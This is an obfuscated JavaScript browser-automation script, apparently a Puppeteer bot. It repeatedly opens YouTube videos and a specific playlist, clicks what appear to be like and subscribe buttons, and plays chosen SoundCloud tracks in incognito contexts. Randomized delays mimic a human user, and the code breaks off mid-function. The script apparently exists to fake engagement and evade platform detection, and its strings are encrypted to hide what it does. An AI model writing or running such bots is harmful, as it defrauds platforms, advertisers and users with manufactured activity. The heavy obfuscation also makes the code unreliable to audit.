const Z = c,
  Y = b,
  X = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x2152 + -0x1496 + -0xcbb))) + i;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x2665 * 0x1 + 0x2c2 + -0xbe1 * -0x3);
    let h = e[f];
    if (c['CzxuLz'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0xe8e + 0x2679 * -0x1 + -0x1d7 * -0xd, r, s, t = -0x1f32 + -0x26a5 + -0x3ad * -0x13; s = m['charAt'](t++); ~s && (r = q % (-0xeb5 + -0x20ce + 0x2f87) ? r * (0x1b7b + 0x7e4 + 0x25 * -0xf3) + s : s, q++ % (0x61 * 0x21 + 0x287 + -0x3e * 0x3e)) ? o += String['fromCharCode'](0xbd8 * 0x1 + 0x1a87 + -0x2560 & r >> (-(0x1 * 0x10b4 + 0x7 * 0xd6 + 0x4a * -0x4e) * q & 0x2141 + -0x1d1c + -0x41f)) : 0x546 + -0x23d4 + 0x1 * 0x1e8e) {
          s = n['indexOf'](s);
        }
        for (let u = 0x3 * -0x6db + -0x179b * -0x1 + -0x30a, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x1 * 0x1308 + 0x5d * 0x30 + -0x2468))['slice'](-(-0x266b + -0x43b + 0x2aa8));
        }
        return decodeURIComponent(p);
      };
      c['znylUS'] = i, b = arguments, c['CzxuLz'] = !![];
    }
    const j = e[-0x1 * -0x15c3 + 0x1 * -0x14b9 + -0x10a],
      k = f + j,
      l = b[k];
    return !l ? (h = c['znylUS'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x1 * -0x1f1b + -0x104a + 0x2f65), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x1 * 0xb65f + 0x144d * 0x4 + -0x9263 + (0x44b * 0x16 + 0x3f1f * -0x1 + 0x1b45) * random()) : await standardWaitForNetIdle(f), await wait(0x3 * -0x1f7 + 0x10b4 * 0x1 + 0xcb * 0xb + (0x251c + 0x4282 + -0x408e) * random()), -0xb10 + 0x546 + 0x5cb;
}
async function standardWaitForNetIdle(f) {
  return await wait(0xce4 + 0x3 * 0xd5 + 0x1 * 0x425), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x4 * -0x67f + 0x1 * -0x643 + 0x81 * 0x40;
}
async function randomWait() {
  return await wait(-0x9ea + -0x266b + 0x43dd + (-0x26a3 + -0x1 * -0x15c3 + 0x5 * 0x748) * random()), -0xf5e + 0x234b + -0x13ec;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x1 * 0x1e1f + 0xa65 * 0x1 + 0x5 * 0x3f2, -0x1 * -0x13 + -0x11 * 0x83 + 0x8a7), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x400 * -0x6f + -0x12df * 0xf + 0x4971) * getRandomInt(0xb * 0x177 + -0xf16 + -0x105, 0x1b1 * 0x7 + -0xde * 0x11 + 0x2ec), h)), 0x1f * -0x3b + 0x1 * 0x79d + -0x77;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x86e + -0xa8e + 0x12fc;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x6 * 0x87 + -0x2a7 + -0x82]['split']('\x20');
    for (let k = -0x1f48 + -0x1f72 + -0xd9 * -0x4a; k < i['length']; k += 0xdad + -0x6b * 0x4f + 0x1 * 0x135a)
      j += i[k] * h[i[k + (0x1060 + -0x1d98 + -0x1 * -0xd39)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const R = b,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x22b9 + -0x27 * 0x9d + 0x3aaa)['map'](l => Array['from'](l['children']))['flat'](-0x8af + 0x3 * -0x663 + -0x1bd9 * -0x1)['map'](l => l['childNodes'][0x1b3a + -0x1384 + -0x7b5]['childNodes'][-0x98e + 0x380 + 0x3e * 0x19]['childNodes'][0x2 * 0xdfe + -0x248 + -0x19b3]['childNodes'][-0x1 * -0x154e + -0xba * -0x14 + 0x5f9 * -0x6]['childNodes'][0x251c + 0x1dd4 + -0x42ef]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])][R(0x13, 'aEe0') + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0xfc5 + -0x1d + -0x4 * 0x2f0, -0x6b9 + 0xa95 + 0xfac)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x30fc + -0x1 * 0x4b95 + -0x1 * -0xb729);
  const h = await getMaxTime(f),
    i = Math['min']((-0x38e7 * -0x7 + 0x14371 * 0x1 + 0x5 * -0x617a) * getRandomInt(-0x2 * -0x896 + -0x65 * 0x2 + 0x20 * -0x83, 0x1 * 0x18b0 + -0x7 * 0x1c + -0x17e7), h);
  return await wait(i), -0x3f9 + -0x10d8 + -0x52 * -0x41;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x1b42 + 0x19a6 + -0x1 * -0x19c]['children'][0x223 * 0xa + 0x136e + -0x175 * 0x1c]['children'][-0x371 + -0x1055 + 0x13c6]['children'][0x81f + -0x65b * -0x3 + -0x1b30]['children'][-0x1dfa + 0xf1c + -0xede * -0x1]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x182 + 0x1 * -0x1cde + 0x1e61;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x2665 * 0x1 + 0x2c2 + -0xbe1 * -0x3);
    let h = e[f];
    if (b['sIJKQz'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0xe8e + 0x2679 * -0x1 + -0x1d7 * -0xd, s, t, u = -0x1f32 + -0x26a5 + -0x3ad * -0x13; t = n['charAt'](u++); ~t && (s = r % (-0xeb5 + -0x20ce + 0x2f87) ? s * (0x1b7b + 0x7e4 + 0x25 * -0xf3) + t : t, r++ % (0x61 * 0x21 + 0x287 + -0x3e * 0x3e)) ? p += String['fromCharCode'](0xbd8 * 0x1 + 0x1a87 + -0x2560 & s >> (-(0x1 * 0x10b4 + 0x7 * 0xd6 + 0x4a * -0x4e) * r & 0x2141 + -0x1d1c + -0x41f)) : 0x546 + -0x23d4 + 0x1 * 0x1e8e) {
          t = o['indexOf'](t);
        }
        for (let v = 0x3 * -0x6db + -0x179b * -0x1 + -0x30a, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x1 * 0x1308 + 0x5d * 0x30 + -0x2468))['slice'](-(-0x266b + -0x43b + 0x2aa8));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1 * -0x15c3 + 0x1 * -0x14b9 + -0x10a,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x234b + -0x87b + -0x1ad0; u < 0xa65 + 0xcd7 * 0x2 + 0x3 * -0xbb1; u++) {
          p[u] = u;
        }
        for (u = -0x1 * -0x13 + -0x11 * 0x83 + 0x8a0; u < -0x100 * -0x25 + -0x63 * 0x3d + -0xc69; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0xb * 0x177 + -0xf16 + -0x7), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1b1 * 0x7 + -0xde * 0x11 + 0x2e7, q = 0x1f * -0x3b + 0x1 * 0x79d + -0x78;
        for (let v = -0x86e + -0xa8e + 0x12fc; v < n['length']; v++) {
          u = (u + (0x6 * 0x87 + -0x2a7 + -0x82)) % (-0x1f48 + -0x1f72 + -0xa9f * -0x6), q = (q + p[u]) % (0xdad + -0x6b * 0x4f + 0x7 * 0x2e8), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1060 + -0x1d98 + -0x4 * -0x38e)]);
        }
        return t;
      };
      b['oQxXrE'] = m, c = arguments, b['sIJKQz'] = !![];
    }
    const j = e[-0x22b9 + -0x27 * 0x9d + 0x3aa4],
      k = f + j,
      l = c[k];
    return !l ? (b['pNSvhz'] === undefined && (b['pNSvhz'] = !![]), h = b['oQxXrE'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function searchAndView(f) {
  const S = b;
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + S(0xb, 'EvN#'), searchTerms['random'](), {
    'delay': -0xea4 * -0x1 + 0x1f2d + -0x2d6d + (-0x208e + 0x2 * -0x5f2 + -0xb29 * -0x4) * random()
  }), await wait(-0x1923 + 0x2130 + 0xdf * -0x7 + (-0x1 * -0x12b2 + 0x1 * -0x24f9 + -0xd * -0x17f) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const T = c,
      k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0xcdf + 0x24de + -0x31bb]['childNodes'][-0x1 * -0x248c + 0x24fa + 0x3b * -0x13f]['childNodes'][0x258b + 0x6 * 0x4a4 + -0x1 * 0x4162]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1dd5 + 0x36d * 0x1 + -0x267 * -0xb]['childNodes'][-0xa9f + -0x11f6 + -0x987 * -0x3][T(0xc)][0xbb * 0xc + 0x1de4 + -0x26a6 * 0x1]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x1 * -0x22f3 + 0x1000 + 0x1979 * -0x2),
          r = -0x2 * -0x10a3 + -0x1124 + -0x1022;
        for (let u = 0x1674 + 0x562 + -0x3fa * 0x7; u < q['length']; u += 0x13 * -0x1d7 + 0x136b + -0xa * -0x18e)
          r += q[u] * k[q[u + (0x1b62 + 0x677 + -0x21d8)]];
        return r;
      }(n);
  });
  await wait((-0x3a9 * 0x19 + -0x61f1 + 0x3 * 0x52ae) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0xd758 + 0x1196 * 0x15 + -0x31 * 0x726) * getRandomInt(0x51 + 0xd7c * 0x1 + -0xdcc * 0x1, -0x18ce + -0x215e + -0x1d1b * -0x2), h + (-0x8 * 0x5e + 0x95 * -0x1d + 0x2759));
  return await wait(i), -0x11 * -0x1cd + 0x4dd + -0x3f1 * 0x9;
}
async function keyWatch(f) {
  const U = b;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x266b + -0xaff + 0xea * -0x1e), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + U(0x0, '4fGN') + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + U(0x12, 'jb2K') + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      const V = b;
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x71a + -0xfa4 + 0x2276 + (-0x199e + 0x104a + -0xf2 * -0xe) * Math[V(0x16, ')y#n')]());
    });
  }, 0x1 * -0x1db5 + -0x33da + 0x6ce7);
  await wait(-0x2 * 0x1db0 + -0xe338 + 0x5b278);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x12f55 * -0x1 + -0x7f * 0x259 + -0xa72c * -0x5) * getRandomInt(0xa4 + 0x1960 + -0x1a00, -0x1 * 0x211f + 0x3 * -0xcff + 0x4835)), clearInterval(h), 0x199 * -0xb + -0xfc0 * 0x1 + -0x2154 * -0x1;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x44 * 0x4f + -0x16da + -0x2 * -0x15eb;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x254 * -0x8 + -0x7ea + -0xab5;
    await randomWait();
  }
  return -0x7a4 + -0x3bc * 0x1 + 0xb61;
}

function fetchRandomSC() {
  return Math['random']() <= 0x1ef9 + 0x1ced + -0x3be6 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x4 * 0x76d + 0xf * -0x1 + -0x13 * -0x191 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x2665 * 0x1 + 0x2c2 + -0xbe1 * -0x3);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x101a + -0x386 * -0x1 + -0x13a0 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x2361 + 0x11b9 + -0x351a;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const W = c;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + W(0xa) + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x2b9 * -0x3d + 0x716 * 0xa + -0x3 * 0x1463 + getRandomInt(0x6cfc + 0x70aa + -0xa30e, 0x8 * 0x856 + -0x4 * 0x1d68 + 0x434 * 0x28));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x3 * -0x6d9 + 0x33e + -0x17c8), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0xca * -0x16 + -0x1 * 0x1a2d + 0x2b89;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x4a6 * 0x8 + 0xcb1 + 0x187f, -0x17 * 0x178 + -0x3 * -0x11b + 0xa7 * 0x2f)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x3 * -0x92b + 0x18b9 * 0x1 + 0xa98 + floor((0x201 * -0x9 + 0x1 * -0xb5e + -0x214f * -0x1) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x40cf8dd6 + -0x26 * 0x29c42b1 + 0x12401741c),
          0x36dd57 * -0x1 + -0x48a60f + -0x1 * -0xff8366,
          -0x1 * 0x3bd5 + 0x1 * -0xed8b + 0x1a960,
          0x71a + -0x1 * -0x19f9 + -0x2093
        ], y = [
          0x1f4a + -0x98 * -0x8 + -0x23f2,
          -0x1bf7 + 0x1b1b + 0xec,
          0xe0a + 0x6ea + -0x14ec,
          -0x1a47 + -0xc68 * -0x2 + -0x5 * -0x4b
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x7 * -0xda + -0x7bb + 0x1c6)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x20c5 * -0x1 + 0xd61 + -0x2e26; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1009 * -0x1 + -0x388 + 0x1391) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x12b3 * 0x1 + -0x3ec * -0x1 + -0x169f] = A[-0xde4 + -0x1 * 0x106 + -0x1aa * -0x9] = A[-0x1cef + 0xb * 0x33 + 0x1abf] = A[0x853 * 0x3 + -0xbb4 + -0xd43] = A[-0x239d + -0x1f * -0x82 + -0x9f1 * -0x2] = A[-0xa2c + -0xa21 + 0x1451] = A[-0x2132 + 0xbf4 + -0x1 * -0x1543] = A[0xc6a + -0x1aa2 + 0xe3e] = A[-0x2303 + -0x1eac + -0xd * -0x50e] = A[0x2395 + 0x1e62 + -0x41ef] = A[-0x1046 + 0x1 * -0x2433 + 0x3482] = A[0xac * -0xa + 0x22 * 0xe3 + 0xbb2 * -0x2] = A[0x9f7 * -0x2 + -0x995 + 0x123 * 0x1a] = A[-0x1be6 + -0x4 * -0x5db + 0x486] = A[-0xf9 * 0x7 + -0xc * -0x13d + -0x800] = A[0x1df5 * -0x1 + 0x14ac + 0x957] = A[-0x231b + -0xbf2 + 0x2f1c] = -0xd * -0x2c1 + 0x595 + 0x14b1 * -0x2, this['blocks'] = A) : this['blocks'] = [
                0x15b * -0x5 + 0x1 * -0x102f + 0x16f6,
                0xfa2 + 0x42 * -0x57 + 0x6cc,
                -0x30a + 0x259a + -0x2290,
                0xb22 + 0x17f5 * -0x1 + -0x1 * -0xcd3,
                0x19ba + 0xb16 + -0x24d0,
                -0xb73 + -0x6 * -0x289 + -0x3c3,
                -0x3 * -0xc2f + 0x445 * -0x9 + 0x2 * 0xf0,
                0xdb8 + -0x130b + -0x2f * -0x1d,
                -0x428 + 0x53 * 0x41 + -0x10eb,
                -0x15e2 + -0xc1b + 0x4db * 0x7,
                -0x15f + 0x5c9 * -0x4 + 0x19 * 0xfb,
                -0x3 * -0x704 + -0xf9 * 0x9 + 0x1 * -0xc4b,
                0x1367 + 0xcec + -0x2053,
                -0x579 + -0xac0 + 0x1039,
                -0x5 * -0x20f + -0x4b * 0x15 + 0x212 * -0x2,
                0xc1 * -0x13 + 0x1 * -0x164d + 0x24a0,
                0x39b * -0x3 + 0x482 + -0x64f * -0x1
              ], this['h0'] = 0x3 * 0x197edf5d + 0x768baa37 + -0x37 * 0x1ab1c9b, this['h1'] = 0x45 * 0x2065ca7 + -0x190cfb41d + -0x144a249 * -0x18b, this['h2'] = 0xa0ed6ca * -0x19 + -0x5a3870e + 0x199d15dc6, this['h3'] = -0x15 * 0x17540d1 + -0xd90b22f + 0x3c6157ca, this['h4'] = -0x79d * -0x21644e + 0xc617df70 + 0xeee0d * -0x112e, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0xd8b + -0x1 * -0x2162 + 0x1 * -0x13d7, this['finalized'] = this['hashed'] = -0x2 * 0xdbd + 0x1701 + -0x1 * -0x479, this['first'] = -0x19 * -0x38 + -0x9 * -0x233 + -0x1942;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x267d * 0x1 + 0x274 * -0xc + -0x1 * -0x43ed, O = J['length'] || 0x1cbd + -0x865 * 0x3 + -0x38e, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x9 * 0x3f3 + 0x2 * 0x1206 + 0x3 * -0x17dd, P[-0x35 * 0x68 + -0x1314 + -0x144e * -0x2] = this['block'], P[-0x38f * 0x1 + 0x1 * 0x18a1 + -0x1502] = P[-0x1419 + 0x1f53 + 0xdd * -0xd] = P[0x2627 * 0x1 + 0x1344 + -0x3969] = P[-0x22e2 + -0x7 * 0x9e + -0x1 * -0x2737] = P[0x19b3 + -0x5 * -0x212 + -0x2409] = P[0x12cb + -0x35e * 0x9 + 0xb88] = P[0x8f3 + 0x1c75 + -0x3 * 0xc76] = P[0xfba + -0x1cea + -0xc7 * -0x11] = P[0x8ef * 0x1 + -0x983 + -0x1a * -0x6] = P[0x2466 * 0x1 + -0x10f3 * 0x1 + -0x136a] = P[0xf00 + 0x2324 + -0x79 * 0x6a] = P[0x3 * -0x5b5 + -0x1 * 0x1274 + -0x2f * -0xc2] = P[0x3 * -0x112 + -0x51 * 0x24 + 0xea6] = P[0xfd1 + -0x1cf * 0x15 + -0x2f * -0x79] = P[-0xf61 + 0x1643 + -0x6d4] = P[0x1 * 0x251d + -0x22ee + -0x220] = 0x71 + -0x3e + -0x33), K) {
                    for (N = this['start']; M < O && N < 0x22db + -0x1a12 + -0x73 * 0x13; ++M)
                      P[N >> 0x9e6 + 0xab9 + 0x1 * -0x149d] |= J[M] << y[-0x11ec + -0x1d7a * 0x1 + 0x2f69 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x5 * 0x4b7 + -0x1398 + -0x3bb; ++M)
                      (L = J['charCodeAt'](M)) < -0x86 * 0x6 + 0x41 * -0x86 + -0xc8e * -0x3 ? P[N >> -0x27 * -0x8 + 0x1e * -0x4f + 0x80c] |= L << y[-0x332 + 0xc02 + -0x3 * 0x2ef & N++] : L < 0x21b6 + -0x1195 + -0x821 ? (P[N >> 0x35 + -0x5 * -0x296 + -0xd21] |= (0x762 + 0x1376 + 0x2 * -0xd0c | L >> -0x157 * 0x3 + -0x64f + 0xa5a * 0x1) << y[0x376 * 0x1 + -0x13f6 + 0x1083 & N++], P[N >> 0x1 * -0x22f7 + 0xab4 + 0x1845] |= (0xf1e * -0x1 + 0x126e + -0x2d0 | 0x229f + 0x23cc + 0x4 * -0x118b & L) << y[-0x1a9d + 0x62b + 0x1475 & N++]) : L < 0x5cb7 * 0x1 + 0x173f1 + -0x4 * 0x3e2a || L >= -0x12473 + -0x111eb * -0x1 + 0xf288 ? (P[N >> -0xd * 0x136 + 0xe1c + 0x1a4] |= (0xf4 * -0x16 + 0x3 * 0x89b + -0x71 * 0x9 | L >> -0x1a5 * 0x5 + 0xd * -0x1b7 + 0x1e90) << y[-0x1c8d + -0x13e6 + 0x1 * 0x3076 & N++], P[N >> -0x701 + -0x6 * 0x3ab + 0x1d05] |= (0x1 * 0x1796 + -0x1 * -0x2e7 + -0x19fd * 0x1 | L >> -0x1c88 + 0xaa7 + 0x11e7 & 0x1cc7 + 0x7b * 0x3d + -0x39d7) << y[0xb3f + 0x17ac + 0x45d * -0x8 & N++], P[N >> -0x1e08 + 0x7 * -0x193 + 0x290f] |= (-0x210a + -0x167 + 0x6fd * 0x5 | 0x123 + 0x7 * -0x416 + -0xddb * -0x2 & L) << y[-0x7b9 + 0x33 * 0x3b + -0x405 & N++]) : (L = 0x1 * 0xd459 + -0xed4b + 0x118f2 + ((-0x256 + 0x1aa * -0xf + -0x1f4b * -0x1 & L) << 0x3a5 * 0x3 + -0x823 + -0x2 * 0x161 | -0x7 * 0x223 + 0x1 * -0x3aa + 0x169e & J['charCodeAt'](++M)), P[N >> -0x2056 + -0x21 * 0xd4 + 0x3bac] |= (-0x79e + -0x22c1 + 0x2b4f * 0x1 | L >> 0x3 * 0x411 + -0x1e0a + 0x11e9) << y[0x13ea + -0x348 + 0xb9 * -0x17 & N++], P[N >> -0x60f + -0x19b9 + -0x1a * -0x139] |= (-0x79f * -0x1 + -0xfc6 + 0x5 * 0x1bb | L >> 0x1872 + 0x17c2 + -0x3028 & 0x422 + 0x17b * -0x3 + 0x8e) << y[0x1 * 0xa3 + 0xb * -0x1cd + 0x132f & N++], P[N >> 0x1d * 0xa2 + 0x4 * -0x865 + -0x27 * -0x64] |= (-0x1 * 0x764 + 0x159e * 0x1 + 0x6dd * -0x2 | L >> -0x19a4 + 0xdf * -0x1a + 0x305 * 0x10 & 0x25c * 0x5 + -0x22d7 + 0x174a) << y[-0x1de4 * 0x1 + 0x1a18 + 0x3cf & N++], P[N >> 0x1359 + -0x2492 + 0x113b] |= (0x1 * -0x215f + -0xea + 0x22c9 | 0x165f + 0x2285 + -0x38a5 & L) << y[0x8 * -0x29f + -0xbf * -0x2e + -0xd57 & N++]);
                  }
